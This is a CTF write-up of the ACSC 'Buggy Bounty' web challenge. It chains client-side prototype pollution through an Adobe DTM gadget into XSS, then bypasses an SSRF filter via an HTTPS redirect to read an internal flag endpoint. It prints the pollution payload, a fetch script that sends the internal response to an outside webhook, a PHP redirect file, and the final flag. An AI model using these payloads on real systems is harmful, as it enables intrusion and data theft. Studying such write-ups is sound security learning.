---
title: ACSC - [Buggy Bounty]
tags:
  - CTF
  - Write-up
  - web-exploitation
  - acsc
  - nodejs
  - server-side
  - client-side
  - prototype-pollution
  - ssrf
categories:
  - CTF
  - Write Up
---
![[Screenshot 2024-03-31 at 19.33.40.png]]
# Prologue
An online CTF competition by ACSC, this competition is qualification for competing in ICC for ASIA category.

![[buggy-bounty.tar.gz]]
# Write Up
## TL;DR Solution

Exploiting prototype pollution to achieve XSS with gadget in Adobe DTM. After that, chaining a Bypass SSRF to get the flag.

## Detailed Explanation

### Initial Analysis

We were given a simple web-app with this directory structure.
![[Screenshot 2024-04-01 at 01.39.36.png]]

The flag location is in the `./reward` application, where the flag is hosted in HTTP

```python
# ./reward/app.py
# 8< -- snip -- >8
@app.route('/bounty', methods=['GET'])
def get_bounty():
    flag = os.environ.get('FLAG')
    if flag:
        return flag
# 8< -- snip -- >8
```

After that, it host a simple bug bounty triaging.
![[Screenshot 2024-04-01 at 01.46.10.png]]

#### Prototype Pollution to XSS
Looking at the file, there's a `arg-1.4.js` which is [vulnerable](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md) to prototype pollution. And we can see, there's `launch-ENa21cfed3f06f4ddf9690de8077b39e81-development.min.js`, we can use this library to use it as [gadget](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/adobe-dtm.md) to achieve XSS.


```js
// ./bugbounty/app/routes/routes.js
// 8< -- snip - snip -- >8
router.get("/triage", (req, res) => {
  try {
    if (!isAdmin(req)) { //[1]
      return res.status(401).send({
        err: "Permission denied",
      });
    }
    let bug_id = req.query.id;
    let bug_url = req.query.url;
    let bug_report = req.query.report;

    return res.render("triage.html", {
      id: bug_id,
      url: bug_url,
      report: bug_report,
    });
  } catch (e) {
    res.status(500).send({
      error: "Server Error",
    });
  }
});
// 8< -- snip - snip -- >8
```
These files were loaded in the `/triage` route, which protected by admin (or bot) only [1].


To proof the existence of XSS, i need to little bit modify the `isAdmin()` function. 

```
__proto__[src]=data:,alert(1)//
```
![[Screenshot 2024-04-01 at 12.48.54.png]]

#### Bypassing SSRF

There's another suspicious route in this challenge, and it was a `/check_valid_url`.
```js
// ./bugbounty/app/routes/routes.js
// 8< -- snip - snip -- >8
const ssrfFilter = require("ssrf-req-filter");
// 8< -- snip - snip -- >8
router.get("/check_valid_url", async (req, res) => {
  try {
    if (!isAdmin(req)) {
      return res.status(401).send({
        err: "Permission denied",
      });
    }

    const report_url = req.query.url;
    const customAgent = ssrfFilter(report_url); //[2]
    
    request( //[3]
      { url: report_url, agent: customAgent },
      function (error, response, body) {
        if (!error && response.statusCode == 200) {
          res.send(body);
        } else {
          console.error("Error:", error);
          res.status(500).send({ err: "Server error" });
        }
      }
    );
  } catch (e) {
    res.status(500).send({
      error: "Server Error",
    });
  }
});
// 8< -- snip - snip -- >8
```

As we can see, this route limited into admin only. Our input will be filtered with `ssrfFilter` [2]. After that, The input will be on requested by `request` library [3].  

By looking at the library requests, i found there's an open security issue by [Doyensec](https://github.com/request/request/issues/3442)

We can just host a HTTPS web server and redirect it to local network. 
### Exploitation

If we looking at the DOM after prototype pollution, we are actually polluting the `src` in the `script` tag, we can just host a file to prevent any encoding issue.
![[Screenshot 2024-04-01 at 14.31.56.png]]

The JS file
```js
fetch(`/check_valid_url?admin=1&url=https://.ngrok-free.app/`).then((r)=>r.text().then((r)=>window.location=`http://webhook/`+(r)))
```

Host a PHP file to redirect the `request` library into `http://reward:5000/bounty`
```php
<?php
header('Location: http://reward:5000/bounty');
```

As we can see in below snippet, our input isn't sanitized, So, we can make use of this feature to add arbitrary parameter to pollute the client.
```js
// ./bugbounty/app/routes/routes.js
// 8< -- snip - snip -- >8
router.post("/report_bug", async (req, res) => {
  try {
    const id = req.body.id;
    const url = req.body.url;
    const report = req.body.report;
    await visit(
      `http://127.0.0.1/triage?id=${id}&url=${url}&report=${report}`,
      authSecret
    );
  } catch (e) {
    console.log(e);
    return res.render("index.html", { err: "Server Error" });
  }
  const reward = Math.floor(Math.random() * (100 - 10 + 1)) + 10;
  return res.render("index.html", {
    message: "Rewarded " + reward + "$",
  });
});
```

![[Screenshot 2024-04-01 at 21.52.02.png]]

Checking the webhook and we can see the flag
![[Screenshot 2024-04-01 at 21.52.22.png]]

FLAG: `ACSC{y0u_4ch1eved_th3_h1ghest_r3w4rd_1n_th3_Buggy_Bounty_pr0gr4m}`







